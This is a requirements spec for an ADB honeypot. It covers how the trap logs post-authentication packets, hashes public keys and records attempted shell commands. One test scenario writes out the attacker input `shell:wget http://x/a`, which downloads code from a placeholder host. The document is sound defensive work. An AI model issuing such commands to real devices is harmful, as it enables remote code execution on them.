## ADDED Requirements

### Requirement: Post-AUTH capture
After sending the AUTH token the ADB trap SHALL read up to 8 further packets, each with at most 4096 bytes of data (a longer declared length ends the session with outcome `too_long`). An `AUTH` packet of type signature or public key SHALL be recorded as an auth attempt with a SHA-256 hash of the key only; a signature SHALL be answered with a new AUTH token. An `OPEN` packet whose destination starts with `shell:` or `exec:` SHALL be recorded as a command (bounded to 256 bytes) and answered with `CLSE`; the session then ends. Other `OPEN` destinations are ignored.

#### Scenario: Shell open
- **WHEN** a client completes CNXN and sends `OPEN` with destination `shell:wget http://x/a`
- **THEN** a command is logged and the connection receives `CLSE`

#### Scenario: Public key
- **WHEN** a client answers the token with an `AUTH` public key packet
- **THEN** an auth attempt with a key hash is logged and no key bytes appear in log or alert meta

#### Scenario: Silent client
- **WHEN** the client sends nothing after the token
- **THEN** the session ends at the session timeout with outcome `timeout`

#### Scenario: Client hangs up
- **WHEN** the client closes the connection after the token
- **THEN** the session ends with outcome `completed`
